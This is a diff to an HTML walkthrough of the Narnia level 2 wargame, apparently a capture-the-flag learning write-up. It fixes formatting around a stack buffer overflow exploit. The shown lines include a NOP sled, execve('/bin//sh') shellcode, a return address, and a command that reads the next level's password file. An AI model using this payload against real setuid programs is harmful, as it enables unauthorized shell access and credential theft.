@@ -73,7 +73,7 @@ Enter narnia2 with password obtained from Level 1.(Refer <a href="https://karthi
       Rough breakdown can be like 128 bytes for buffer, 4 bytes for return address, 4 bytes for function call, 8 bytes garbage. Check return address is AAAA with 0x41 *144 as argument
       <pre class="prettyprint">
         <code>
-        gdb --args /narnia/narnia2 $(python -c 'print "\x41"*144
+        gdb --args /narnia/narnia2 $(python -c 'print "\x41"*144'
         (gdb) run
       </code>
       </pre>
@@ -93,7 +93,11 @@ Enter narnia2 with password obtained from Level 1.(Refer <a href="https://karthi
 
       <li>Choose a return address in the middle of sea of 0x90s.An example would be 0xffffd7c0. </li>
       <li>Execute ./narnia2 with payload and return address.</li>
+      <pre class="prettyprint">
+        <code>
       /narnia/narnia2 $(python -c 'print "\x90"*108+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"+"\xc0\xd7\xff\xff"')
+      </code>
+      </pre>
       <li>Shell prompt will pop up on execution. Check whose privileges you have with "whoami" command. Crack the password for Narnia Level 3 with "cat /etc/narnia_pass/narnia3"</li>
       <img src="/static/images/projects/p11/i4.png" class="image-center image-biggest" />
     </ol>
